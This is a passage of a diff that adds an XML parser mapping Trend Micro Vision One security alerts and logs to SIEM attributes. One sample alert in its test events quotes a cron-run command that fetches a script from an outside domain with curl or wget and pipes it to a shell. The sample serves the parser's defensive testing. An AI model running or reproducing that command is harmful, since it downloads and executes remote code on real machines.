@@ -1,0 +1,737 @@
+<eventParser name="TrendMicroVisionOneParser">
+  <deviceType>
+    <Vendor>TrendMicro</Vendor>
+    <Model>Vision One</Model>
+    <Version>ANY</Version>
+  </deviceType>
+
+  <eventFormatRecognizer><![CDATA[^\[Trend_Vision_One_.*\] = ]]></eventFormatRecognizer>
+
+  <testEvents>
+    <testEvent><![CDATA[[Trend_Vision_One_Alert] = {"alertProvider":"SAE","caseId":null,"createdDateTime":"2023-10-16T15:11:19Z","description":"","firstInvestigatedDateTime":null,"id":"WB-10797-20231016-00003","impactScope":{"accountCount":0,"cloudIdentityCount":0,"containerCount":0,"desktopCount":0,"emailAddressCount":0,"entities":[{"entityId":"11111111-1111-1111-1111-111111111111","entityType":"host","entityValue":{"guid":"11111111-1111-1111-1111-111111111111","ips":["192.168.10.20"],"name":"server1"},"provenance":["Alert"],"relatedEntities":[],"relatedIndicatorIds":[1,2,3,4,5,6,7,8]}],"serverCount":1},"incidentId":"IC-10797-11111111-00000","indicators":[{"field":"processCmd","filterIds":["11111111-1111-1111-1111-111111111111"],"id":1,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"command_line","value":"/usr/sbin/crond -n"},{"field":"malName","filterIds":["11111111-1111-1111-1111-111111111111"],"id":2,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"detection_name","value":"TM_MALWARE_BEHAVIOR"},{"field":"policyId","filterIds":["11111111-1111-1111-1111-111111111111"],"id":3,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"detection_name","value":"SUSP_SCHED_REMOTE_CODE"},{"field":"filePathName","filterIds":["11111111-1111-1111-1111-111111111111"],"id":4,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"fullpath","value":"/usr/sbin/crond"},{"field":"actResult","filterIds":["11111111-1111-1111-1111-111111111111"],"id":5,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"text","value":"Passed"},{"field":"scanType","filterIds":["11111111-1111-1111-1111-111111111111"],"id":6,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"text","value":"REALTIME"},{"field":"targetType","filterIds":["11111111-1111-1111-1111-111111111111"],"id":7,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"text","value":"Uncategorized"},{"field":"target","filterIds":["11111111-1111-1111-1111-111111111111"],"id":8,"provenance":["Alert"],"relatedEntities":["11111111-1111-1111-1111-111111111111"],"type":"text","value":"/bin/sh -c (curl -fsSL -m15 lsd.systemtxn.org||wget -q -T15 -O- lsd.systemtxn.org)|sh"}],"investigationResult":null,"investigationStatus":"In Progress","matchedRules":[{"id":"11111111-1111-1111-1111-111111111111","matchedFilters":[{"id":"11111111-1111-1111-1111-111111111111","matchedDateTime":"2023-10-16T13:59:01.000Z","matchedEvents":[{"matchedDateTime":"2023-10-16T13:59:01.000Z","type":"PRODUCT_EVENT_LOG","uuid":"11111111-1111-1111-1111-111111111111"}],"mitreTechniqueIds":[],"name":"test"}],"name":"Default Custom Rule"}],"model":"teste","modelId":"11111111-1111-1111-1111-111111111111","modelType":"custom","ownerIds":[],"phCustId":1,"schemaVersion":"1.14","score":63,"serverIp":"10.10.10.11","serverName":"api.xdr.trendmicro.com","severity":"high","status":null,"updatedDateTime":"2023-10-30T11:38:18Z","workbenchLink":"https://portal.xdr.trendmicro.com/index.html#/workbench/alerts/WB-10797-20231016-00003?ref=0c12e642ca5b7ed4436e5f23f568ae10066608d3"}]]></testEvent>
+    <testEvent><![CDATA[[Trend_Vision_One_Audit_log] = {"accessType":"Console","activity":"Log on","category":"Logon and Logoff","details":{"identifier":{"email":"user@example.com","id":"11111111-1111-1111-1111-111111111111","name":"User1","type":"managedAccount"},"ipAddr":"10.10.10.10"},"loggedDateTime":"2023-10-30T07:36:40Z","loggedRole":"Master Administrator","loggedUser":"user@example.com","phCustId":1,"result":"Successful","serverIp":"10.10.10.11","serverName":"api.xdr.trendmicro.com"}]]></testEvent>
+  </testEvents>
+
+  <parsingInstructions>
+    <collectFieldsByRegex src="$_rawmsg">
+      <regex><![CDATA[\[<eventSource:gPatStrRightSB>\]\s*=\s*<_body:gPatMesgBody>]]></regex>
+    </collectFieldsByRegex>
+    <setEventAttribute attr="extEventRecvProto">TREND_VISION_ONE_API</setEventAttribute>
+    <choose>
+      <when test="not_exist eventSource"/>
+      <when test="$eventSource = 'Trend_Vision_One_Alert'">
+        <setEventAttribute attr="eventType">Trend_Vision_One_Alert</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="providerName" key="alertProvider"/>
+          <attrKeyMap attr="_caseId" key="caseId"/>
+          <!-- incidents are comprised of many alerts in workbench, map to correlation id, incidentId is special in fsm -->
+          <attrKeyMap attr="correlationId" key="incidentId"/>
+          <attrKeyMap attr="_createTime" key="createdDateTime"/>
+          <attrKeyMap attr="description" key="description"/>
+          <attrKeyMap attr="_firstInvestigated" key="firstInvestigatedDateTime"/>
+          <!-- unique string for this alert, used in rules for uniqueness -->
+          <attrKeyMap attr="alertIdStr" key="id"/>
+          <attrKeyMap attr="status" key="investigationStatus"/>
+          <attrKeyMap attr="riskScore" key="score"/>
+          <attrKeyMap attr="_severity" key="severity"/>
+          <attrKeyMap attr="resoStatus" key="investigationResult"/>
+          <attrKeyMap attr="infoURL" key="workbenchLink"/>
+          <!-- detection model is the equivalent to a FSM rule -->
+          <attrKeyMap attr="ruleName" key="model"/>
+          <attrKeyMap attr="ruleIdStr" key="modelId"/>
+          <!-- impactScope details -->
+          <!-- host, account, emailAddress, container, cloudIdentity -->
+          <attrKeyMap attr="_entityType" key="impactScope.entities[0].entityType"/>
+          <!-- entityValue is only object when host, otherwise string -->
+          <attrKeyMap attr="_entityValue" key="impactScope.entities[0].entityValue"/>
+          <attrKeyMap attr="hostIpAddr" key="impactScope.entities[0].entityValue.ips[0]"/>
+          <attrKeyMap attr="hostName" key="impactScope.entities[0].entityValue.name"/>
+          <!-- matchedRules details -->
+          <attrKeyMap attr="detection" key="matchedRules[0].name"/>
+          <!-- indicators -->
+          <attrKeyMap attr="parentCommand" key="indicators.find(field='processCmd', value)"/>
+          <attrKeyMap attr="virusName" key="indicators.find(field='malName', value)"/>
+          <attrKeyMap attr="categoryType" key="indicators.find(field='policyId', value)"/>
+          <attrKeyMap attr="filePath" key="indicators.find(field='filePathName', value)"/>
+          <attrKeyMap attr="resultType" key="indicators.find(field='actResult', value)"/>
+          <attrKeyMap attr="scanEngine" key="indicators.find(field='scanType', value)"/>
+          <attrKeyMap attr="targetType" key="indicators.find(field='targetType', value)"/>
+          <attrKeyMap attr="command" key="indicators.find(field='target', value)"/>
+        </collectAndSetAttrByJSON>
+
+        <when test="exist _entityType">
+          <!-- We preparse values if entityType is host, otherwise try to parse value string appropriately -->
+          <choose>
+            <when test="not_exist _entityValue"/>
+            <when test="$_entityType = 'account'">
+              <setEventAttribute attr="user">$_entityValue</setEventAttribute>
+            </when>
+            <when test="$_entityType = 'emailAddress'">
+              <setEventAttribute attr="mailboxUPN">$_entityValue</setEventAttribute>
+            </when>
+            <when test="$_entityType = 'container'">
+              <setEventAttribute attr="_container">$_entityValue</setEventAttribute>
+            </when>
+            <when test="$_entityType = 'cloudIdentity'">
+              <setEventAttribute attr="user">$_entityValue</setEventAttribute>
+            </when>
+          </choose>
+        </when>
+      </when>
+      <when test="$eventSource = 'Trend_Vision_One_Detection'">
+        <setEventAttribute attr="eventType">Trend_Vision_One_Detection</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="action" key="act[0]"/>
+          <attrKeyMap attr="status" key="actResult[0]"/>
+          <attrKeyMap attr="type" key="eventName"/>
+          <attrKeyMap attr="subtype" key="behaviourCat"/>
+          <attrKeyMap attr="hostIpAddr" key="endpointIp[0]"/>
+          <attrKeyMap attr="fileName" key="fileName[0]"/>
+          <attrKeyMap attr="filePath" key="filePath"/>
+          <attrKeyMap attr="_absFilePath" key="filePathName"/>
+          <attrKeyMap attr="_firstAct" key="firstAct"/>
+          <attrKeyMap attr="_firstActResult" key="firstActResult"/>
+          <attrKeyMap attr="_interestedHost" key="interestedHost"/>
+          <attrKeyMap attr="_interestedIp" key="interestedIp[0]"/>
+          <attrKeyMap attr="machineGUID" key="mDeviceGUID"/>
+          <attrKeyMap attr="virusType" key="majorVirusType"/>
+          <attrKeyMap attr="virusName" key="malName"/>
+          <attrKeyMap attr="appName" key="mpname"/>
+          <attrKeyMap attr="appVersion" key="mpver"/>
+          <attrKeyMap attr="policyName" key="pname"/>
+          <attrKeyMap attr="_policyIdStr" key="policyId"/>
+          <attrKeyMap attr="parentCommand" key="processCmd"/>
+          <attrKeyMap attr="procName" key="processName"/>
+          <attrKeyMap attr="_pver" key="pver"/>
+          <attrKeyMap attr="_rt" key="rt_utc"/>
+          <attrKeyMap attr="scanEngine" key="scanType"/>
+          <attrKeyMap attr="_severity" key="severity"/>
+          <attrKeyMap attr="tagName" key="tags"/>
+          <attrKeyMap attr="command" key="target"/>
+          <attrKeyMap attr="uuid" key="uuid"/>
+          <attrKeyMap attr="destIpPort" key="dpt"/>
+          <attrKeyMap attr="destIpAddr" key="dst[0]"/>
+          <attrKeyMap attr="hostName" key="dvchost"/>
+          <attrKeyMap attr="srcIpPort" key="spt"/>
+          <attrKeyMap attr="srcIpAddr" key="src[0]"/>
+          <attrKeyMap attr="ruleName" key="ruleName"/>
+        </collectAndSetAttrByJSON>
+
+      </when>
+      <when test="$eventSource = 'Trend_Vision_One_Audit_log'">
+        <setEventAttribute attr="eventType">Trend_Vision_One_Audit</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <!-- accessType is API or Console, the source of activity -->
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="eventSource" key="accessType"/>
+          <attrKeyMap attr="activityName" key="activity"/>
+          <attrKeyMap attr="categoryType" key="category"/>
+          <attrKeyMap attr="_eventTime" key="loggedDateTime"/>
+          <attrKeyMap attr="roleName" key="loggedRole"/>
+          <attrKeyMap attr="user" key="loggedUser"/>
+          <attrKeyMap attr="_result" key="result"/>
+          <attrKeyMap attr="description" key="details.description"/>
+          <attrKeyMap attr="mailboxUPN" key="details.identifier.email"/>
+          <attrKeyMap attr="srcIpAddr" key="details.ipAddr"/>
+          <attrKeyMap attr="userFullName" key="details.identifier.name"/>
+          <attrKeyMap attr="userId" key="details.identifier.id"/>
+          <attrKeyMap attr="status" key="details.status"/>
+          <attrKeyMap attr="_workbenchId" key="details.workbenchId"/>
+        </collectAndSetAttrByJSON>
+      </when>
+      <when test="$eventSource = 'Trend_Vision_One_Endpoint_Activity'">
+        <setEventAttribute attr="eventType">Trend_Vision_One_Endpoint</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="msgId" key="eventHashId"/>
+          <attrKeyMap attr="_eventId" key="eventId"/>
+          <attrKeyMap attr="_eventSourceType" key="eventSourceType"/>
+          <attrKeyMap attr="_eventSubId" key="eventSubId"/>
+          <attrKeyMap attr="_eventTime" key="eventTime"/>
+          <attrKeyMap attr="_firstSeen" key="firstSeen"/>
+          <attrKeyMap attr="_lastSeen" key="lastSeen"/>
+          <attrKeyMap attr="user" key="logonUser[0]"/>
+          <attrKeyMap attr="machineGUID" key="endpointGuid"/>
+          <attrKeyMap attr="hostName" key="endpointHostName"/>
+          <attrKeyMap attr="hostIpAddr" key="endpointIp[0]"/>
+          <attrKeyMap attr="hostMACAddr" key="endpointMacAddress[0]"/>
+          <attrKeyMap attr="_hostMACList" key="endpointMacAddress"/>
+          <attrKeyMap attr="filePath" key="objectFilePath"/>
+          <attrKeyMap attr="osType" key="osDescription"/>
+          <attrKeyMap attr="osName" key="osName"/>
+          <attrKeyMap attr="osVersion" key="osVer"/>
+          <attrKeyMap attr="parentFileHashCode" key="parentFileHashSha256"/>
+          <attrKeyMap attr="parentFolder" key="parentFilePath"/>
+          <attrKeyMap attr="parentProcName" key="parentName"/>
+          <attrKeyMap attr="parentProcId" key="parentPid"/>
+          <attrKeyMap attr="_parentUser" key="parentUser"/>
+          <attrKeyMap attr="product" key="pname"/>
+          <attrKeyMap attr="command" key="processCmd"/>
+          <attrKeyMap attr="hashSHA256" key="processFileHashSha256"/>
+          <attrKeyMap attr="filePath" key="processFilePath"/>
+          <attrKeyMap attr="procName" key="processName"/>
+          <attrKeyMap attr="procId" key="processPid"/>
+          <attrKeyMap attr="procOwner" key="processUser"/>
+          <attrKeyMap attr="domain" key="userDomain[0]"/>
+          <attrKeyMap attr="uuid" key="uuid"/>
+          <attrKeyMap attr="destIpPort" key="dpt"/>
+          <attrKeyMap attr="destIpAddr" key="dst"/>
+        </collectAndSetAttrByJSON>
+      </when>
+      <when test="$eventSource = 'Trend_Vision_One_Container_Activity'">
+        <setEventAttribute attr="eventType">Trend_Vision_One_Container</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="_clusterId" key="clusterId"/>
+          <attrKeyMap attr="_clusterName" key="clusterName"/>
+          <attrKeyMap attr="_containerId" key="containerId"/>
+          <attrKeyMap attr="_containerName" key="containerName"/>
+          <attrKeyMap attr="_containerImage" key="containerImage"/>
+          <!-- sha256:43f6cee5ca002505ea142b3821a76d585aa0c8d22bc58b7e48589ca7deb41234 -->
+          <attrKeyMap attr="_containerHash" key="containerImageDigest"/>
+          <attrKeyMap attr="_k8Namespace" key="k8sNamespace"/>
+          <attrKeyMap attr="_k8PodId" key="k8sPodId"/>
+          <attrKeyMap attr="_k8PodName" key="k8sPodName"/>
+          <attrKeyMap attr="_eventId" key="eventId"/>
+          <attrKeyMap attr="_eventSourceType" key="eventSourceType"/>
+          <attrKeyMap attr="_eventSubId" key="eventSubId"/>
+          <attrKeyMap attr="_eventTime" key="eventTime"/>
+          <attrKeyMap attr="_firstSeen" key="firstSeen"/>
+          <attrKeyMap attr="_lastSeen" key="lastSeen"/>
+          <attrKeyMap attr="user" key="logonUser[0]"/>
+          <attrKeyMap attr="_objectUser" key="objectUser"/>
+          <attrKeyMap attr="machineGUID" key="endpointGuid"/>
+          <attrKeyMap attr="hostName" key="endpointHostName"/>
+          <attrKeyMap attr="hostIpAddr" key="endpointIp[0]"/>
+          <attrKeyMap attr="hostMACAddr" key="endpointMacAddress[0]"/>
+          <attrKeyMap attr="_hostMACList" key="endpointMacAddress"/>
+          <attrKeyMap attr="filePath" key="objectFilePath"/>
+          <attrKeyMap attr="osType" key="osDescription"/>
+          <attrKeyMap attr="osName" key="osName"/>
+          <attrKeyMap attr="osVersion" key="osVer"/>
+          <attrKeyMap attr="parentFileHashCode" key="parentFileHashSha256"/>
+          <attrKeyMap attr="parentFolder" key="parentFilePath"/>
+          <attrKeyMap attr="parentProcName" key="parentName"/>
+          <attrKeyMap attr="parentProcId" key="parentPid"/>
+          <attrKeyMap attr="_parentUser" key="parentUser"/>
+          <attrKeyMap attr="product" key="pname"/>
+          <attrKeyMap attr="command" key="processCmd"/>
+          <attrKeyMap attr="hashSHA256" key="processFileHashSha256"/>
+          <attrKeyMap attr="filePath" key="processFilePath"/>
+          <attrKeyMap attr="procName" key="processName"/>
+          <attrKeyMap attr="procId" key="processPid"/>
+          <attrKeyMap attr="procOwner" key="processUser"/>
+          <attrKeyMap attr="domain" key="userDomain[0]"/>
+          <attrKeyMap attr="uuid" key="uuid"/>
+          <attrKeyMap attr="destIpPort" key="dpt"/>
+          <attrKeyMap attr="destIpAddr" key="dst"/>
+        </collectAndSetAttrByJSON>
+      </when>
+      <when test="$eventSource = 'Trend_Vision_One_Analysis_Result'">
+        <setEventAttribute attr="eventType">Trend_Vision_One_Analysis_Result</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="detection" key="detectionNames"/>
+          <attrKeyMap attr="objType" key="type"/>
+          <attrKeyMap attr="appRisk" key="riskLevel"/>
+          <attrKeyMap attr="threatType" key="threatTypes"/>
+          <attrKeyMap attr="hashSHA256" key="digest.sha256"/>
+          <attrKeyMap attr="fileType" key="trueFileType"/>
+        </collectAndSetAttrByJSON>
+      </when>
+      <otherwise>
+        <setEventAttribute attr="eventType">Trend_Vision_One_Generic</setEventAttribute>
+        <collectAndSetAttrByJSON src="$_body">
+          <attrKeyMap attr="actionName" key="act"/>
+          <attrKeyMap attr="actionResult" key="actResult"/>
+          <attrKeyMap attr="activityName" key="activity"/>
+          <attrKeyMap attr="providerName" key="alertProvider"/>
+          <attrKeyMap attr="_eventTime" key="analysisCompletionDateTime"/>
+          <attrKeyMap attr="appName" key="app"/>
+          <attrKeyMap attr="appGroupName" key="appGroup"/>
+          <attrKeyMap attr="appName" key="application"/>
+          <attrKeyMap attr="reason" key="blocking"/>
+          <attrKeyMap attr="riskScore" key="cat"/>
+          <attrKeyMap attr="categoryType" key="category"/>
+          <attrKeyMap attr="_severity" key="cccaRiskLevel"/>
+          <attrKeyMap attr="clientIpAddr" key="clientIp"/>
+          <attrKeyMap attr="clusterId" key="clusterId"/>
+          <attrKeyMap attr="cluster" key="clusterName"/>
+          <attrKeyMap attr="count" key="cnt"/>
+          <attrKeyMap attr="company" key="companyName"/>
+          <attrKeyMap attr="componentName" key="component"/>
+          <attrKeyMap attr="fileSize" key="compressedFileSize"/>
+          <attrKeyMap attr="imageName" key="containerImage"/>
+          <attrKeyMap attr="_containerName" key="containerName"/>
+          <attrKeyMap attr="_createTime" key="createdDateTime"/>
+          <attrKeyMap attr="Filter" key="customFilterTags"/>
+          <attrKeyMap attr="inCustomerId" key="customerId"/>
+          <attrKeyMap attr="description" key="description"/>
+          <attrKeyMap attr="detail" key="detail"/>
+          <attrKeyMap attr="detection" key="detectionType"/>
+          <attrKeyMap attr="direction" key="deviceDirection"/>
+          <attrKeyMap attr="machineGUID" key="deviceGUID"/>
+          <attrKeyMap attr="hostMACAddr" key="deviceMacAddress"/>
+          <attrKeyMap attr="procName" key="deviceProcessName"/>
+          <attrKeyMap attr="hostName" key="dhost"/>
+          <attrKeyMap attr="hashMD5" key="digest.md5"/>
+          <attrKeyMap attr="Hash" key="digest.sha1"/>
+          <attrKeyMap attr="hashSHA256" key="digest.sha256"/>
+          <attrKeyMap attr="domain" key="domainName"/>
+          <attrKeyMap attr="destIpPort" key="dpt"/>
+          <attrKeyMap attr="destIpAddr" key="dst"/>
+          <attrKeyMap attr="durationMSec" key="duration"/>
+          <attrKeyMap attr="_scanEnd" key="end"/>
+          <attrKeyMap attr="_endpointGuid" key="endpointGuid"/>
+          <attrKeyMap attr="hostName" key="endpointHostName"/>
+          <attrKeyMap attr="hostIpAddrList" key="endpointIp"/>
+          <attrKeyMap attr="scanEngine" key="engType"/>
+          <attrKeyMap attr="scanEngineVer" key="engVer"/>
+          <attrKeyMap attr="_eventId" key="eventId"/>
+          <attrKeyMap attr="activityType" key="eventName"/>
+          <attrKeyMap attr="_activityType" key="eventName"/>
+          <attrKeyMap attr="_eventSubId" key="eventSubId"/>
+          <attrKeyMap attr="activityName" key="eventSubName"/>
+          <attrKeyMap attr="_activityName" key="eventSubName"/>
+          <attrKeyMap attr="_eventTime" key="eventTime"/>
+          <attrKeyMap attr="hashCode" key="fileHash"/>
+          <attrKeyMap attr="hashSHA256" key="fileHashSha256"/>
+          <attrKeyMap attr="fileName" key="fileName"/>
+          <attrKeyMap attr="actionName" key="fileOperation"/>
+          <attrKeyMap attr="filePath" key="filePath"/>
+          <attrKeyMap attr="fileSize" key="fileSize"/>
+          <attrKeyMap attr="fileType" key="fileType"/>
+          <attrKeyMap attr="_severity" key="filterRiskLevel"/>
+          <attrKeyMap attr="filePath" key="fullPath"/>
+          <attrKeyMap attr="hostName" key="hostName"/>
+          <attrKeyMap attr="httpReferrer" key="httpReferer"/>
+          <attrKeyMap attr="alertIdStr" key="id"/>
+          <attrKeyMap attr="uuid" key="id"/>
+          <attrKeyMap attr="_impactScope" key="impactScope"/>
+          <attrKeyMap attr="inIncidentIdStr" key="incidentId"/>
+          <attrKeyMap attr="_indicators" key="indicators"/>
+          <attrKeyMap attr="status" key="investigationStatus"/>
+          <attrKeyMap attr="_eventTime" key="loggedDateTime"/>
+          <attrKeyMap attr="role" key="loggedRole"/>
+          <attrKeyMap attr="user" key="loggedUser"/>
+          <attrKeyMap attr="logonUserList" key="logonUser"/>
+          <attrKeyMap attr="receiverMailAddr" key="mailFromAddresses"/>
+          <attrKeyMap attr="emailId" key="mailMsgId"/>
+          <attrKeyMap attr="mailSubject" key="mailMsgSubject"/>
+          <attrKeyMap attr="senderMailAddr" key="mailSenderIp"/>
+          <attrKeyMap attr="mailDomain" key="mailSourceDomain"/>
+          <attrKeyMap attr="relatedReceiverMailAddr" key="mailToAddresses"/>
+          <attrKeyMap attr="exchMboxName" key="mailbox"/>
+          <attrKeyMap attr="virusName" key="malName"/>
+          <attrKeyMap attr="virusType" key="malType"/>
+          <attrKeyMap attr="_matchedRules" key="matchedRules"/>
+          <attrKeyMap attr="virusType" key="mimeType"/>
+          <!-- Detection model used to trigger alert -->
+          <attrKeyMap attr="ruleName" key="model"/>
+          <attrKeyMap attr="ruleIdStr" key="modelId"/>
+          <attrKeyMap attr="product" key="mpname"/>
+          <attrKeyMap attr="uuid" key="msgUuid"/>
+          <attrKeyMap attr="command" key="objectCmd"/>
+          <attrKeyMap attr="hashMD5" key="objectFileHashMd5"/>
+          <attrKeyMap attr="targetHashCode" key="objectFileHashSha1"/>
+          <attrKeyMap attr="Hash" key="objectFileHashSha1"/>
+          <attrKeyMap attr="hashSHA256" key="objectFileHashSha256"/>
+          <attrKeyMap attr="filePath" key="objectFilePath"/>
+          <attrKeyMap attr="targetName" key="objectHostName"/>
+          <attrKeyMap attr="targetName" key="objectName"/>
+          <attrKeyMap attr="regKeyPath" key="objectRegistryData"/>
+          <attrKeyMap attr="regValueName" key="objectRegistryValue"/>
+          <attrKeyMap attr="objType" key="objectTrueType"/>
+          <attrKeyMap attr="targetUser" key="objectUser"/>
+          <attrKeyMap attr="user" key="objectUser"/>
+          <attrKeyMap attr="osName" key="os"/>
+          <attrKeyMap attr="osName" key="osName"/>
+          <attrKeyMap attr="parentCommand" key="parentCmd"/>
+          <attrKeyMap attr="parentFileHashCode" key="parentFileHashSha1"/>
+          <attrKeyMap attr="parentFileName" key="parentFilePath"/>
+          <attrKeyMap attr="parentProcName" key="parentName"/>
+          <attrKeyMap attr="parentProcId" key="parentPid"/>
+          <attrKeyMap attr="phCustId" key="phCustId"/>
+          <attrKeyMap attr="policyName" key="policyId"/>
+          <attrKeyMap attr="policyName" key="policyUuid"/>
+          <attrKeyMap attr="userPrincipalName" key="principalName"/>
+          <attrKeyMap attr="command" key="processCmd"/>
+          <attrKeyMap attr="procPath" key="processFilePath"/>
+          <attrKeyMap attr="procName" key="processName"/>
+          <attrKeyMap attr="procId" key="processPid"/>
+          <attrKeyMap attr="product" key="productCode"/>
+          <attrKeyMap attr="profileName" key="profile"/>
+          <attrKeyMap attr="wlanProtocol" key="proto"/>
+          <attrKeyMap attr="_receivedTime" key="receivedTime"/>
+          <attrKeyMap attr="infoURL" key="request"/>
+          <attrKeyMap attr="domain" key="requestBase"/>
+          <attrKeyMap attr="httpUserAgent" key="requestClientApplication"/>
+          <attrKeyMap attr="httpMethod" key="requestMethod"/>
+          <attrKeyMap attr="mimeType" key="requestMimeType"/>
+          <attrKeyMap attr="status" key="result"/>
+          <attrKeyMap attr="_severity" key="riskLevel"/>
+          <attrKeyMap attr="_scanBegin" key="rt"/>
+          <attrKeyMap attr="_recivedTime" key="rt"/>
+          <attrKeyMap attr="scanEngine" key="scanType"/>
+          <attrKeyMap attr="version" key="schemaVersion"/>
+          <attrKeyMap attr="riskScore" key="score"/>
+          <attrKeyMap attr="clientReputationScore" key="score"/>
+          <attrKeyMap attr="srcUser" key="sender"/>
+          <attrKeyMap attr="reptDevIpAddr" key="serverIp"/>
+          <attrKeyMap attr="reptDevName" key="serverName"/>
+          <attrKeyMap attr="httpVersion" key="serverProtocol"/>
+          <attrKeyMap attr="tlsVersion" key="serverTls"/>
+          <attrKeyMap attr="_severity" key="severity"/>
+          <attrKeyMap attr="srcIpPort" key="spt"/>
+          <attrKeyMap attr="srcIpAddr" key="src"/>
+          <attrKeyMap attr="hashSHA1" key="srcFileHashSha1"/>
+          <attrKeyMap attr="srcFilePath" key="srcFilePath"/>
+          <attrKeyMap attr="user" key="suid"/>
+          <attrKeyMap attr="attackTactic" key="tacticId"/>
+          <attrKeyMap attr="tagName" key="tags"/>
+          <attrKeyMap attr="tenantId" key="tenantGuid"/>
+          <attrKeyMap attr="threatValue" key="threatName"/>
+          <attrKeyMap attr="threatType" key="threatTypes"/>
+          <attrKeyMap attr="fileType" key="trueFileType"/>
+          <attrKeyMap attr="type" key="type"/>
+          <attrKeyMap attr="_updateTime" key="updatedDateTime"/>
+          <attrKeyMap attr="_eventTime" key="updatedDateTime"/>
+          <attrKeyMap attr="httpUserAgent" key="userAgent"/>
+          <attrKeyMap attr="uuid" key="uuid"/>
+          <attrKeyMap attr="version" key="version"/>
+          <attrKeyMap attr="winEventId" key="winEventId"/>
+          <attrKeyMap attr="infoURL" key="workbenchLink"/>
+        </collectAndSetAttrByJSON>
+
+      </otherwise>
+    </choose>
+
+    <when test="exist _interestedHost">
+      <when test="not_exist hostName">
+        <setEventAttribute attr="hostName">$_interestedHost</setEventAttribute>
+      </when>
+    </when>
+
+    <when test="exist _interestedIp">
+      <when test="not_exist hostIpAddr">
+        <setEventAttribute attr="hostIpAddr">$_interestedIp</setEventAttribute>
+      </when>
+    </when>
+
+    <when test="exist hostIpAddrList">
+      <setEventAttribute attr="hostIpAddrList">replaceStringByRegex($hostIpAddrList,"[\[\] \"]+", "")</setEventAttribute>
+    </when>
+
+    <choose>
+      <when test="not_exist _severity"/>
+      <when test="$_severity = 'critical'">
+        <setEventAttribute attr="eventSeverity">10</setEventAttribute>
+      </when>
+      <when test="$_severity = 'high'">
+        <setEventAttribute attr="eventSeverity">9</setEventAttribute>
+      </when>
+      <when test="$_severity = 'medium'">
+        <setEventAttribute attr="eventSeverity">6</setEventAttribute>
+      </when>
+      <when test="$_severity = 'low'">
+        <setEventAttribute attr="eventSeverity">4</setEventAttribute>
+      </when>
+      <otherwise/>
+    </choose>
+
+    <!-- These only seem to apply to endpoint and container endpoint activity events -->
+    <choose>
+      <when test="not_exist _eventId"/>
+      <when test="$_eventId = '1'">
+        <setEventAttribute attr="type">EVENT_PROCESS</setEventAttribute>
+      </when>
+      <when test="$_eventId = '2'">
+        <setEventAttribute attr="type">EVENT_FILE</setEventAttribute>
+      </when>
+      <when test="$_eventId = '3'">
+        <setEventAttribute attr="type">EVENT_CONNECTIO</setEventAttribute>
+      </when>
+      <when test="$_eventId = '4'">
+        <setEventAttribute attr="type">EVENT_DNS</setEventAttribute>
+      </when>
+      <when test="$_eventId = '5'">
+        <setEventAttribute attr="type">EVENT_REGISTRY</setEventAttribute>
+      </when>
+      <when test="$_eventId = '6'">
+        <setEventAttribute attr="type">EVENT_ACCOUNT</setEventAttribute>
+      </when>
+      <when test="$_eventId = '7'">
+        <setEventAttribute attr="type">EVENT_INTERNET</setEventAttribute>
+      </when>
+      <when test="$_eventId = '8'">
+        <setEventAttribute attr="type">XDR_EVENT_MODIFIED_PROCESS</setEventAttribute>
+      </when>
+      <when test="$_eventId = '9'">
+        <setEventAttribute attr="type">EVENT_WINDOWS_HOOK</setEventAttribute>
+      </when>
+      <when test="$_eventId = '10'">
+        <setEventAttribute attr="type">EVENT_WINDOWS_EVENT</setEventAttribute>
+      </when>
+      <when test="$_eventId = '11'">
+        <setEventAttribute attr="type">EVENT_AMSI</setEventAttribute>
+      </when>
+      <when test="$_eventId = '12'">
+        <setEventAttribute attr="type">EVENT_WMI</setEventAttribute>
+      </when>
+      <when test="$_eventId = '13'">
+        <setEventAttribute attr="type">TELEMETRY_MEMORY</setEventAttribute>
+      </when>
+      <when test="$_eventId = '14'">
+        <setEventAttribute attr="type">TELEMETRY_BM</setEventAttribute>
+      </when>
+      <otherwise>
+        <setEventAttribute attr="type">$_eventId</setEventAttribute>
+      </otherwise>
+    </choose>
+    <!-- When event subtype id exists -->
+    <choose>
+      <when test="not_exist _eventSubId"/>
+      <when test="$_eventSubId = '0'">
+        <setEventAttribute attr="subtype">TELEMETRY_NONE</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '1'">
+        <setEventAttribute attr="subtype">XDR_PROCESS_OPEN</setEventAttribute>
+      </when>
+      <when test="$_eventSubId = '2'">
